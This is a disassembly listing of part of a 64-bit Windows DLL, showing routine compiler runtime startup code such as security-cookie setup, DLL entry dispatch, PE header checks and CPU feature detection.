   1800016ba:	ff 15 78 d9 00 00    	call   *0xd978(%rip)        # 0x18000f038
   1800016c0:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800016c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800016ca:	ff 15 60 d9 00 00    	call   *0xd960(%rip)        # 0x18000f030
   1800016d0:	8b c0                	mov    %eax,%eax
   1800016d2:	48 31 44 24 20       	xor    %rax,0x20(%rsp)
   1800016d7:	ff 15 4b d9 00 00    	call   *0xd94b(%rip)        # 0x18000f028
   1800016dd:	8b c0                	mov    %eax,%eax
   1800016df:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1800016e4:	48 31 44 24 20       	xor    %rax,0x20(%rsp)
   1800016e9:	ff 15 31 d9 00 00    	call   *0xd931(%rip)        # 0x18000f020
   1800016ef:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1800016f4:	8b c8                	mov    %eax,%ecx
   1800016f6:	48 c1 e1 20          	shl    $0x20,%rcx
   1800016fa:	48 33 c8             	xor    %rax,%rcx
   1800016fd:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   180001702:	48 33 4c 24 20       	xor    0x20(%rsp),%rcx
   180001707:	48 33 c8             	xor    %rax,%rcx
   18000170a:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
   180001711:	ff 00 00 
   180001714:	48 23 c8             	and    %rax,%rcx
   180001717:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   18000171e:	2b 00 00 
   180001721:	48 3b cb             	cmp    %rbx,%rcx
   180001724:	48 0f 44 c8          	cmove  %rax,%rcx
   180001728:	48 89 0d d1 88 01 00 	mov    %rcx,0x188d1(%rip)        # 0x18001a000
   18000172f:	48 f7 d1             	not    %rcx
   180001732:	48 89 0d 07 89 01 00 	mov    %rcx,0x18907(%rip)        # 0x18001a040
   180001739:	48 83 c4 30          	add    $0x30,%rsp
   18000173d:	5b                   	pop    %rbx
   18000173e:	c3                   	ret
   18000173f:	cc                   	int3
   180001740:	48 8d 0d 59 93 01 00 	lea    0x19359(%rip),%rcx        # 0x18001aaa0
   180001747:	48 ff 25 f2 d8 00 00 	rex.W jmp *0xd8f2(%rip)        # 0x18000f040
   18000174e:	cc                   	int3
   18000174f:	cc                   	int3
   180001750:	48 8d 0d 49 93 01 00 	lea    0x19349(%rip),%rcx        # 0x18001aaa0
   180001757:	e9 d4 0a 00 00       	jmp    0x180002230
   18000175c:	cc                   	int3
   18000175d:	cc                   	int3
   18000175e:	cc                   	int3
   18000175f:	cc                   	int3
   180001760:	48 8d 05 49 93 01 00 	lea    0x19349(%rip),%rax        # 0x18001aab0
   180001767:	c3                   	ret
   180001768:	cc                   	int3
   180001769:	cc                   	int3
   18000176a:	cc                   	int3
   18000176b:	cc                   	int3
   18000176c:	cc                   	int3
   18000176d:	cc                   	int3
   18000176e:	cc                   	int3
   18000176f:	cc                   	int3
   180001770:	48 8d 05 41 93 01 00 	lea    0x19341(%rip),%rax        # 0x18001aab8
   180001777:	c3                   	ret
   180001778:	cc                   	int3
   180001779:	cc                   	int3
   18000177a:	cc                   	int3
   18000177b:	cc                   	int3
   18000177c:	cc                   	int3
   18000177d:	cc                   	int3
   18000177e:	cc                   	int3
   18000177f:	cc                   	int3
   180001780:	48 83 ec 28          	sub    $0x28,%rsp
   180001784:	e8 d7 ff ff ff       	call   0x180001760
   180001789:	48 83 08 24          	orq    $0x24,(%rax)
   18000178d:	e8 de ff ff ff       	call   0x180001770
   180001792:	48 83 08 02          	orq    $0x2,(%rax)
   180001796:	48 83 c4 28          	add    $0x28,%rsp
   18000179a:	c3                   	ret
   18000179b:	cc                   	int3
   18000179c:	cc                   	int3
   18000179d:	cc                   	int3
   18000179e:	cc                   	int3
   18000179f:	cc                   	int3
   1800017a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800017a4:	e8 e7 06 00 00       	call   0x180001e90
   1800017a9:	85 c0                	test   %eax,%eax
   1800017ab:	74 2c                	je     0x1800017d9
   1800017ad:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1800017b4:	00 00 
   1800017b6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1800017ba:	33 c0                	xor    %eax,%eax
   1800017bc:	f0 48 0f b1 0d 03 93 	lock cmpxchg %rcx,0x19303(%rip)        # 0x18001aac8
   1800017c3:	01 00 
   1800017c5:	74 12                	je     0x1800017d9
   1800017c7:	48 3b c8             	cmp    %rax,%rcx
   1800017ca:	74 14                	je     0x1800017e0
   1800017cc:	33 c0                	xor    %eax,%eax
   1800017ce:	f0 48 0f b1 0d f1 92 	lock cmpxchg %rcx,0x192f1(%rip)        # 0x18001aac8
   1800017d5:	01 00 
   1800017d7:	75 ee                	jne    0x1800017c7
   1800017d9:	32 c0                	xor    %al,%al
   1800017db:	48 83 c4 28          	add    $0x28,%rsp
   1800017df:	c3                   	ret
   1800017e0:	b0 01                	mov    $0x1,%al
   1800017e2:	48 83 c4 28          	add    $0x28,%rsp
   1800017e6:	c3                   	ret
   1800017e7:	cc                   	int3
   1800017e8:	cc                   	int3
   1800017e9:	cc                   	int3
   1800017ea:	cc                   	int3
   1800017eb:	cc                   	int3
   1800017ec:	cc                   	int3
   1800017ed:	cc                   	int3
   1800017ee:	cc                   	int3
   1800017ef:	cc                   	int3
   1800017f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800017f4:	e8 97 06 00 00       	call   0x180001e90
   1800017f9:	85 c0                	test   %eax,%eax
   1800017fb:	74 0c                	je     0x180001809
   1800017fd:	e8 ce 03 00 00       	call   0x180001bd0
   180001802:	b0 01                	mov    $0x1,%al
   180001804:	48 83 c4 28          	add    $0x28,%rsp
   180001808:	c3                   	ret
   180001809:	e8 72 06 00 00       	call   0x180001e80
   18000180e:	8b c8                	mov    %eax,%ecx
   180001810:	e8 5b 3a 00 00       	call   0x180005270
   180001815:	85 c0                	test   %eax,%eax
   180001817:	74 07                	je     0x180001820
   180001819:	32 c0                	xor    %al,%al
   18000181b:	48 83 c4 28          	add    $0x28,%rsp
   18000181f:	c3                   	ret
   180001820:	e8 13 3e 00 00       	call   0x180005638
   180001825:	b0 01                	mov    $0x1,%al
   180001827:	48 83 c4 28          	add    $0x28,%rsp
   18000182b:	c3                   	ret
   18000182c:	cc                   	int3
   18000182d:	cc                   	int3
   18000182e:	cc                   	int3
   18000182f:	cc                   	int3
   180001830:	48 83 ec 28          	sub    $0x28,%rsp
   180001834:	80 3d 96 92 01 00 00 	cmpb   $0x0,0x19296(%rip)        # 0x18001aad1
   18000183b:	75 65                	jne    0x1800018a2
   18000183d:	e8 4e 06 00 00       	call   0x180001e90
   180001842:	85 c0                	test   %eax,%eax
   180001844:	74 27                	je     0x18000186d
   180001846:	48 8d 0d 8b 92 01 00 	lea    0x1928b(%rip),%rcx        # 0x18001aad8
   18000184d:	e8 86 3f 00 00       	call   0x1800057d8
   180001852:	85 c0                	test   %eax,%eax
   180001854:	75 10                	jne    0x180001866
   180001856:	48 8d 0d 93 92 01 00 	lea    0x19293(%rip),%rcx        # 0x18001aaf0
   18000185d:	e8 76 3f 00 00       	call   0x1800057d8
   180001862:	85 c0                	test   %eax,%eax
   180001864:	74 35                	je     0x18000189b
   180001866:	32 c0                	xor    %al,%al
   180001868:	48 83 c4 28          	add    $0x28,%rsp
   18000186c:	c3                   	ret
   18000186d:	66 0f 6f 05 ab da 00 	movdqa 0xdaab(%rip),%xmm0        # 0x18000f320
   180001874:	00 
   180001875:	f3 0f 7f 05 5b 92 01 	movdqu %xmm0,0x1925b(%rip)        # 0x18001aad8
   18000187c:	00 
   18000187d:	48 c7 05 60 92 01 00 	movq   $0xffffffffffffffff,0x19260(%rip)        # 0x18001aae8
   180001884:	ff ff ff ff 
   180001888:	f3 0f 7f 05 60 92 01 	movdqu %xmm0,0x19260(%rip)        # 0x18001aaf0
   18000188f:	00 
   180001890:	48 c7 05 65 92 01 00 	movq   $0xffffffffffffffff,0x19265(%rip)        # 0x18001ab00
   180001897:	ff ff ff ff 
   18000189b:	c6 05 2f 92 01 00 01 	movb   $0x1,0x1922f(%rip)        # 0x18001aad1
   1800018a2:	b0 01                	mov    $0x1,%al
   1800018a4:	48 83 c4 28          	add    $0x28,%rsp
   1800018a8:	c3                   	ret
   1800018a9:	cc                   	int3
   1800018aa:	cc                   	int3
   1800018ab:	cc                   	int3
   1800018ac:	cc                   	int3
   1800018ad:	cc                   	int3
   1800018ae:	cc                   	int3
   1800018af:	cc                   	int3
   1800018b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800018b4:	e8 e7 09 00 00       	call   0x1800022a0
   1800018b9:	84 c0                	test   %al,%al
   1800018bb:	74 0e                	je     0x1800018cb
   1800018bd:	e8 82 40 00 00       	call   0x180005944
   1800018c2:	84 c0                	test   %al,%al
   1800018c4:	75 0c                	jne    0x1800018d2
   1800018c6:	e8 f5 09 00 00       	call   0x1800022c0
   1800018cb:	32 c0                	xor    %al,%al
   1800018cd:	48 83 c4 28          	add    $0x28,%rsp
   1800018d1:	c3                   	ret
   1800018d2:	b0 01                	mov    $0x1,%al
   1800018d4:	48 83 c4 28          	add    $0x28,%rsp
   1800018d8:	c3                   	ret
   1800018d9:	cc                   	int3
   1800018da:	cc                   	int3
   1800018db:	cc                   	int3
   1800018dc:	cc                   	int3
   1800018dd:	cc                   	int3
   1800018de:	cc                   	int3
   1800018df:	cc                   	int3
   1800018e0:	48 83 ec 28          	sub    $0x28,%rsp
   1800018e4:	e8 6f 40 00 00       	call   0x180005958
   1800018e9:	e8 d2 09 00 00       	call   0x1800022c0
   1800018ee:	b0 01                	mov    $0x1,%al
   1800018f0:	48 83 c4 28          	add    $0x28,%rsp
   1800018f4:	c3                   	ret
   1800018f5:	cc                   	int3
   1800018f6:	cc                   	int3
   1800018f7:	cc                   	int3
   1800018f8:	cc                   	int3
   1800018f9:	cc                   	int3
   1800018fa:	cc                   	int3
   1800018fb:	cc                   	int3
   1800018fc:	cc                   	int3
   1800018fd:	cc                   	int3
   1800018fe:	cc                   	int3
   1800018ff:	cc                   	int3
   180001900:	40 53                	rex push %rbx
   180001902:	55                   	push   %rbp
   180001903:	56                   	push   %rsi
   180001904:	57                   	push   %rdi
   180001905:	48 83 ec 28          	sub    $0x28,%rsp
   180001909:	49 8b f9             	mov    %r9,%rdi
   18000190c:	49 8b f0             	mov    %r8,%rsi
   18000190f:	8b da                	mov    %edx,%ebx
   180001911:	48 8b e9             	mov    %rcx,%rbp
   180001914:	e8 77 05 00 00       	call   0x180001e90
   180001919:	85 c0                	test   %eax,%eax
   18000191b:	75 16                	jne    0x180001933
   18000191d:	83 fb 01             	cmp    $0x1,%ebx
   180001920:	75 11                	jne    0x180001933
   180001922:	4c 8b c6             	mov    %rsi,%r8
   180001925:	33 d2                	xor    %edx,%edx
   180001927:	48 8b cd             	mov    %rbp,%rcx
   18000192a:	48 8b c7             	mov    %rdi,%rax
   18000192d:	ff 15 25 d9 00 00    	call   *0xd925(%rip)        # 0x18000f258
   180001933:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   180001938:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   18000193c:	48 83 c4 28          	add    $0x28,%rsp
   180001940:	5f                   	pop    %rdi
   180001941:	5e                   	pop    %rsi
   180001942:	5d                   	pop    %rbp
   180001943:	5b                   	pop    %rbx
   180001944:	e9 eb 32 00 00       	jmp    0x180004c34
   180001949:	cc                   	int3
   18000194a:	cc                   	int3
   18000194b:	cc                   	int3
   18000194c:	cc                   	int3
   18000194d:	cc                   	int3
   18000194e:	cc                   	int3
   18000194f:	cc                   	int3
   180001950:	48 83 ec 28          	sub    $0x28,%rsp
   180001954:	e8 37 05 00 00       	call   0x180001e90
   180001959:	85 c0                	test   %eax,%eax
   18000195b:	74 10                	je     0x18000196d
   18000195d:	48 8d 0d 74 91 01 00 	lea    0x19174(%rip),%rcx        # 0x18001aad8
   180001964:	48 83 c4 28          	add    $0x28,%rsp
   180001968:	e9 27 3e 00 00       	jmp    0x180005794
   18000196d:	e8 d6 36 00 00       	call   0x180005048
   180001972:	85 c0                	test   %eax,%eax
   180001974:	75 09                	jne    0x18000197f
   180001976:	48 83 c4 28          	add    $0x28,%rsp
   18000197a:	e9 ad 36 00 00       	jmp    0x18000502c
   18000197f:	48 83 c4 28          	add    $0x28,%rsp
   180001983:	c3                   	ret
   180001984:	cc                   	int3
   180001985:	cc                   	int3
   180001986:	cc                   	int3
   180001987:	cc                   	int3
   180001988:	cc                   	int3
   180001989:	cc                   	int3
   18000198a:	cc                   	int3
   18000198b:	cc                   	int3
   18000198c:	cc                   	int3
   18000198d:	cc                   	int3
   18000198e:	cc                   	int3
   18000198f:	cc                   	int3
   180001990:	48 83 ec 28          	sub    $0x28,%rsp
   180001994:	33 c9                	xor    %ecx,%ecx
   180001996:	e8 05 40 00 00       	call   0x1800059a0
   18000199b:	48 83 c4 28          	add    $0x28,%rsp
   18000199f:	e9 4c 09 00 00       	jmp    0x1800022f0
   1800019a4:	cc                   	int3
   1800019a5:	cc                   	int3
   1800019a6:	cc                   	int3
   1800019a7:	cc                   	int3
   1800019a8:	cc                   	int3
   1800019a9:	cc                   	int3
   1800019aa:	cc                   	int3
   1800019ab:	cc                   	int3
   1800019ac:	cc                   	int3
   1800019ad:	cc                   	int3
   1800019ae:	cc                   	int3
   1800019af:	cc                   	int3
   1800019b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800019b4:	85 c9                	test   %ecx,%ecx
   1800019b6:	75 07                	jne    0x1800019bf
   1800019b8:	c6 05 11 91 01 00 01 	movb   $0x1,0x19111(%rip)        # 0x18001aad0
   1800019bf:	e8 0c 02 00 00       	call   0x180001bd0
   1800019c4:	e8 a7 08 00 00       	call   0x180002270
   1800019c9:	84 c0                	test   %al,%al
   1800019cb:	74 10                	je     0x1800019dd
   1800019cd:	e8 5e 3f 00 00       	call   0x180005930
   1800019d2:	84 c0                	test   %al,%al
   1800019d4:	75 0e                	jne    0x1800019e4
   1800019d6:	33 c9                	xor    %ecx,%ecx
   1800019d8:	e8 f3 08 00 00       	call   0x1800022d0
   1800019dd:	32 c0                	xor    %al,%al
   1800019df:	48 83 c4 28          	add    $0x28,%rsp
   1800019e3:	c3                   	ret
   1800019e4:	b0 01                	mov    $0x1,%al
   1800019e6:	48 83 c4 28          	add    $0x28,%rsp
   1800019ea:	c3                   	ret
   1800019eb:	cc                   	int3
   1800019ec:	cc                   	int3
   1800019ed:	cc                   	int3
   1800019ee:	cc                   	int3
   1800019ef:	cc                   	int3
   1800019f0:	48 83 ec 18          	sub    $0x18,%rsp
   1800019f4:	4c 8b c1             	mov    %rcx,%r8
   1800019f7:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1800019fc:	66 39 05 fd e5 ff ff 	cmp    %ax,-0x1a03(%rip)        # 0x180000000
   180001a03:	75 71                	jne    0x180001a76
   180001a05:	48 63 0d 30 e6 ff ff 	movslq -0x19d0(%rip),%rcx        # 0x18000003c
   180001a0c:	48 8d 15 ed e5 ff ff 	lea    -0x1a13(%rip),%rdx        # 0x180000000
   180001a13:	48 03 ca             	add    %rdx,%rcx
   180001a16:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180001a1c:	75 58                	jne    0x180001a76
   180001a1e:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001a23:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001a27:	75 4d                	jne    0x180001a76
   180001a29:	4c 2b c2             	sub    %rdx,%r8
   180001a2c:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   180001a30:	48 83 c0 18          	add    $0x18,%rax
   180001a34:	48 03 c1             	add    %rcx,%rax
   180001a37:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
   180001a3b:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   180001a3f:	4c 8d 0c d0          	lea    (%rax,%rdx,8),%r9
   180001a43:	48 89 04 24          	mov    %rax,(%rsp)
   180001a47:	49 3b c1             	cmp    %r9,%rax
   180001a4a:	74 26                	je     0x180001a72
   180001a4c:	8b 50 0c             	mov    0xc(%rax),%edx
   180001a4f:	4c 3b c2             	cmp    %rdx,%r8
   180001a52:	72 18                	jb     0x180001a6c
   180001a54:	8b 48 08             	mov    0x8(%rax),%ecx
   180001a57:	03 ca                	add    %edx,%ecx
   180001a59:	4c 3b c1             	cmp    %rcx,%r8
   180001a5c:	73 0e                	jae    0x180001a6c
   180001a5e:	83 78 24 00          	cmpl   $0x0,0x24(%rax)
   180001a62:	7d 04                	jge    0x180001a68
   180001a64:	32 c0                	xor    %al,%al
   180001a66:	eb 14                	jmp    0x180001a7c
   180001a68:	b0 01                	mov    $0x1,%al
   180001a6a:	eb 10                	jmp    0x180001a7c
   180001a6c:	48 83 c0 28          	add    $0x28,%rax
   180001a70:	eb d1                	jmp    0x180001a43
   180001a72:	32 c0                	xor    %al,%al
   180001a74:	eb 06                	jmp    0x180001a7c
   180001a76:	32 c0                	xor    %al,%al
   180001a78:	eb 02                	jmp    0x180001a7c
   180001a7a:	32 c0                	xor    %al,%al
   180001a7c:	48 83 c4 18          	add    $0x18,%rsp
   180001a80:	c3                   	ret
   180001a81:	cc                   	int3
   180001a82:	cc                   	int3
   180001a83:	cc                   	int3
   180001a84:	cc                   	int3
   180001a85:	cc                   	int3
   180001a86:	cc                   	int3
   180001a87:	cc                   	int3
   180001a88:	cc                   	int3
   180001a89:	cc                   	int3
   180001a8a:	cc                   	int3
   180001a8b:	cc                   	int3
   180001a8c:	cc                   	int3
   180001a8d:	cc                   	int3
   180001a8e:	cc                   	int3
   180001a8f:	cc                   	int3
   180001a90:	40 53                	rex push %rbx
   180001a92:	48 83 ec 20          	sub    $0x20,%rsp
   180001a96:	0f b6 d9             	movzbl %cl,%ebx
   180001a99:	e8 f2 03 00 00       	call   0x180001e90
   180001a9e:	85 c0                	test   %eax,%eax
   180001aa0:	74 0d                	je     0x180001aaf
   180001aa2:	84 db                	test   %bl,%bl
   180001aa4:	75 09                	jne    0x180001aaf
   180001aa6:	33 c0                	xor    %eax,%eax
   180001aa8:	48 87 05 19 90 01 00 	xchg   %rax,0x19019(%rip)        # 0x18001aac8
   180001aaf:	48 83 c4 20          	add    $0x20,%rsp
   180001ab3:	5b                   	pop    %rbx
   180001ab4:	c3                   	ret
   180001ab5:	cc                   	int3
   180001ab6:	cc                   	int3
   180001ab7:	cc                   	int3
   180001ab8:	cc                   	int3
   180001ab9:	cc                   	int3
   180001aba:	cc                   	int3
   180001abb:	cc                   	int3
   180001abc:	cc                   	int3
   180001abd:	cc                   	int3
   180001abe:	cc                   	int3
   180001abf:	cc                   	int3
   180001ac0:	40 53                	rex push %rbx
   180001ac2:	48 83 ec 20          	sub    $0x20,%rsp
   180001ac6:	80 3d 03 90 01 00 00 	cmpb   $0x0,0x19003(%rip)        # 0x18001aad0
   180001acd:	0f b6 d9             	movzbl %cl,%ebx
   180001ad0:	74 04                	je     0x180001ad6
   180001ad2:	84 d2                	test   %dl,%dl
   180001ad4:	75 0d                	jne    0x180001ae3
   180001ad6:	e8 8d 3e 00 00       	call   0x180005968
   180001adb:	0f b6 cb             	movzbl %bl,%ecx
   180001ade:	e8 ed 07 00 00       	call   0x1800022d0
   180001ae3:	b0 01                	mov    $0x1,%al
   180001ae5:	48 83 c4 20          	add    $0x20,%rsp
   180001ae9:	5b                   	pop    %rbx
   180001aea:	c3                   	ret
   180001aeb:	cc                   	int3
   180001aec:	cc                   	int3
   180001aed:	cc                   	int3
   180001aee:	cc                   	int3
   180001aef:	cc                   	int3
   180001af0:	48 8d 05 61 9a 01 00 	lea    0x19a61(%rip),%rax        # 0x18001b558
   180001af7:	c3                   	ret
   180001af8:	cc                   	int3
   180001af9:	cc                   	int3
   180001afa:	cc                   	int3
   180001afb:	cc                   	int3
   180001afc:	cc                   	int3
   180001afd:	cc                   	int3
   180001afe:	cc                   	int3
   180001aff:	cc                   	int3
   180001b00:	c7 05 fe 8f 01 00 00 	movl   $0x0,0x18ffe(%rip)        # 0x18001ab08
   180001b07:	00 00 00 
   180001b0a:	c3                   	ret
   180001b0b:	cc                   	int3
   180001b0c:	cc                   	int3
   180001b0d:	cc                   	int3
   180001b0e:	cc                   	int3
   180001b0f:	cc                   	int3
   180001b10:	8b c9                	mov    %ecx,%ecx
   180001b12:	cd 29                	int    $0x29
   180001b14:	c3                   	ret
   180001b15:	cc                   	int3
   180001b16:	cc                   	int3
   180001b17:	cc                   	int3
   180001b18:	cc                   	int3
   180001b19:	cc                   	int3
   180001b1a:	cc                   	int3
   180001b1b:	cc                   	int3
   180001b1c:	cc                   	int3
   180001b1d:	cc                   	int3
   180001b1e:	cc                   	int3
   180001b1f:	cc                   	int3
   180001b20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b25:	57                   	push   %rdi
   180001b26:	48 83 ec 20          	sub    $0x20,%rsp
   180001b2a:	48 8d 1d 5f 55 01 00 	lea    0x1555f(%rip),%rbx        # 0x180017090
   180001b31:	48 8d 3d 58 55 01 00 	lea    0x15558(%rip),%rdi        # 0x180017090
   180001b38:	48 3b df             	cmp    %rdi,%rbx
   180001b3b:	73 1a                	jae    0x180001b57
   180001b3d:	0f 1f 00             	nopl   (%rax)
   180001b40:	48 8b 03             	mov    (%rbx),%rax
   180001b43:	48 85 c0             	test   %rax,%rax
   180001b46:	74 06                	je     0x180001b4e
   180001b48:	ff 15 0a d7 00 00    	call   *0xd70a(%rip)        # 0x18000f258
   180001b4e:	48 83 c3 08          	add    $0x8,%rbx
   180001b52:	48 3b df             	cmp    %rdi,%rbx
   180001b55:	72 e9                	jb     0x180001b40
   180001b57:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b5c:	48 83 c4 20          	add    $0x20,%rsp
   180001b60:	5f                   	pop    %rdi
   180001b61:	c3                   	ret
   180001b62:	cc                   	int3
   180001b63:	cc                   	int3
   180001b64:	cc                   	int3
   180001b65:	cc                   	int3
   180001b66:	cc                   	int3
   180001b67:	cc                   	int3
   180001b68:	cc                   	int3
   180001b69:	cc                   	int3
   180001b6a:	cc                   	int3
   180001b6b:	cc                   	int3
   180001b6c:	cc                   	int3
   180001b6d:	cc                   	int3
   180001b6e:	cc                   	int3
   180001b6f:	cc                   	int3
   180001b70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b75:	57                   	push   %rdi
   180001b76:	48 83 ec 20          	sub    $0x20,%rsp
   180001b7a:	48 8d 1d 1f 55 01 00 	lea    0x1551f(%rip),%rbx        # 0x1800170a0
   180001b81:	48 8d 3d 18 55 01 00 	lea    0x15518(%rip),%rdi        # 0x1800170a0
   180001b88:	48 3b df             	cmp    %rdi,%rbx
   180001b8b:	73 1a                	jae    0x180001ba7
   180001b8d:	0f 1f 00             	nopl   (%rax)
   180001b90:	48 8b 03             	mov    (%rbx),%rax
   180001b93:	48 85 c0             	test   %rax,%rax
   180001b96:	74 06                	je     0x180001b9e
   180001b98:	ff 15 ba d6 00 00    	call   *0xd6ba(%rip)        # 0x18000f258
   180001b9e:	48 83 c3 08          	add    $0x8,%rbx
   180001ba2:	48 3b df             	cmp    %rdi,%rbx
   180001ba5:	72 e9                	jb     0x180001b90
   180001ba7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001bac:	48 83 c4 20          	add    $0x20,%rsp
   180001bb0:	5f                   	pop    %rdi
   180001bb1:	c3                   	ret
   180001bb2:	cc                   	int3
   180001bb3:	cc                   	int3
   180001bb4:	cc                   	int3
   180001bb5:	cc                   	int3
   180001bb6:	cc                   	int3
   180001bb7:	cc                   	int3
   180001bb8:	cc                   	int3
   180001bb9:	cc                   	int3
   180001bba:	cc                   	int3
   180001bbb:	cc                   	int3
   180001bbc:	cc                   	int3
   180001bbd:	cc                   	int3
   180001bbe:	cc                   	int3
   180001bbf:	cc                   	int3
   180001bc0:	c2 00 00             	ret    $0x0
   180001bc3:	cc                   	int3
   180001bc4:	cc                   	int3
   180001bc5:	cc                   	int3
   180001bc6:	cc                   	int3
   180001bc7:	cc                   	int3
   180001bc8:	cc                   	int3
   180001bc9:	cc                   	int3
   180001bca:	cc                   	int3
   180001bcb:	cc                   	int3
   180001bcc:	cc                   	int3
   180001bcd:	cc                   	int3
   180001bce:	cc                   	int3
   180001bcf:	cc                   	int3
   180001bd0:	40 56                	rex push %rsi
   180001bd2:	57                   	push   %rdi
   180001bd3:	41 56                	push   %r14
   180001bd5:	48 83 ec 10          	sub    $0x10,%rsp
   180001bd9:	33 c9                	xor    %ecx,%ecx
   180001bdb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180001be0:	33 c0                	xor    %eax,%eax
   180001be2:	0f a2                	cpuid
   180001be4:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   180001bea:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   180001bf0:	0b d1                	or     %ecx,%edx
   180001bf2:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   180001bf8:	44 8b d8             	mov    %eax,%r11d
   180001bfb:	0b d3                	or     %ebx,%edx
   180001bfd:	b8 01 00 00 00       	mov    $0x1,%eax
   180001c02:	b9 00 00 00 00       	mov    $0x0,%ecx
   180001c07:	0f a2                	cpuid
   180001c09:	8b f9                	mov    %ecx,%edi
   180001c0b:	75 5e                	jne    0x180001c6b
   180001c0d:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180001c12:	48 c7 05 3b 84 01 00 	movq   $0x8000,0x1843b(%rip)        # 0x18001a058
   180001c19:	00 80 00 00 
   180001c1d:	48 c7 05 38 84 01 00 	movq   $0xffffffffffffffff,0x18438(%rip)        # 0x18001a060
   180001c24:	ff ff ff ff 
   180001c28:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180001c2d:	74 28                	je     0x180001c57
   180001c2f:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180001c34:	74 21                	je     0x180001c57
   180001c36:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180001c3b:	74 1a                	je     0x180001c57
   180001c3d:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180001c42:	83 f8 20             	cmp    $0x20,%eax
   180001c45:	77 24                	ja     0x180001c6b
   180001c47:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180001c4e:	00 00 00 
   180001c51:	48 0f a3 c1          	bt     %rax,%rcx
   180001c55:	73 14                	jae    0x180001c6b
   180001c57:	44 8b 05 ae 8e 01 00 	mov    0x18eae(%rip),%r8d        # 0x18001ab0c
   180001c5e:	41 83 c8 01          	or     $0x1,%r8d
   180001c62:	44 89 05 a3 8e 01 00 	mov    %r8d,0x18ea3(%rip)        # 0x18001ab0c
   180001c69:	eb 07                	jmp    0x180001c72
   180001c6b:	44 8b 05 9a 8e 01 00 	mov    0x18e9a(%rip),%r8d        # 0x18001ab0c
   180001c72:	45 33 d2             	xor    %r10d,%r10d
   180001c75:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   180001c7a:	45 33 f6             	xor    %r14d,%r14d
   180001c7d:	33 f6                	xor    %esi,%esi
   180001c7f:	41 83 fb 07          	cmp    $0x7,%r11d
   180001c83:	7c 58                	jl     0x180001cdd
   180001c85:	33 c9                	xor    %ecx,%ecx
   180001c87:	b8 07 00 00 00       	mov    $0x7,%eax
   180001c8c:	0f a2                	cpuid
   180001c8e:	8b ea                	mov    %edx,%ebp
   180001c90:	44 8b cb             	mov    %ebx,%r9d
   180001c93:	0f ba e3 09          	bt     $0x9,%ebx
   180001c97:	73 0b                	jae    0x180001ca4
   180001c99:	41 83 c8 02          	or     $0x2,%r8d
   180001c9d:	44 89 05 68 8e 01 00 	mov    %r8d,0x18e68(%rip)        # 0x18001ab0c
   180001ca4:	83 f8 01             	cmp    $0x1,%eax
   180001ca7:	7c 0f                	jl     0x180001cb8
   180001ca9:	b8 07 00 00 00       	mov    $0x7,%eax
   180001cae:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001cb3:	0f a2                	cpuid
   180001cb5:	44 8b d2             	mov    %edx,%r10d
   180001cb8:	41 83 fb 24          	cmp    $0x24,%r11d
   180001cbc:	7c 0c                	jl     0x180001cca
   180001cbe:	b8 24 00 00 00       	mov    $0x24,%eax
   180001cc3:	33 c9                	xor    %ecx,%ecx
   180001cc5:	0f a2                	cpuid
   180001cc7:	44 8b f3             	mov    %ebx,%r14d
   180001cca:	41 83 fb 29          	cmp    $0x29,%r11d
   180001cce:	7c 12                	jl     0x180001ce2
   180001cd0:	b8 29 00 00 00       	mov    $0x29,%eax
   180001cd5:	33 c9                	xor    %ecx,%ecx
   180001cd7:	0f a2                	cpuid
   180001cd9:	8b f3                	mov    %ebx,%esi
   180001cdb:	eb 05                	jmp    0x180001ce2
   180001cdd:	45 33 c9             	xor    %r9d,%r9d
   180001ce0:	33 ed                	xor    %ebp,%ebp
   180001ce2:	48 8b 05 7f 83 01 00 	mov    0x1837f(%rip),%rax        # 0x18001a068
   180001ce9:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180001cee:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   180001cf2:	c7 05 54 83 01 00 01 	movl   $0x1,0x18354(%rip)        # 0x18001a050
   180001cf9:	00 00 00 
   180001cfc:	c7 05 4e 83 01 00 02 	movl   $0x2,0x1834e(%rip)        # 0x18001a054
   180001d03:	00 00 00 
   180001d06:	48 89 05 5b 83 01 00 	mov    %rax,0x1835b(%rip)        # 0x18001a068
   180001d0d:	0f ba e7 14          	bt     $0x14,%edi
   180001d11:	73 1f                	jae    0x180001d32
   180001d13:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
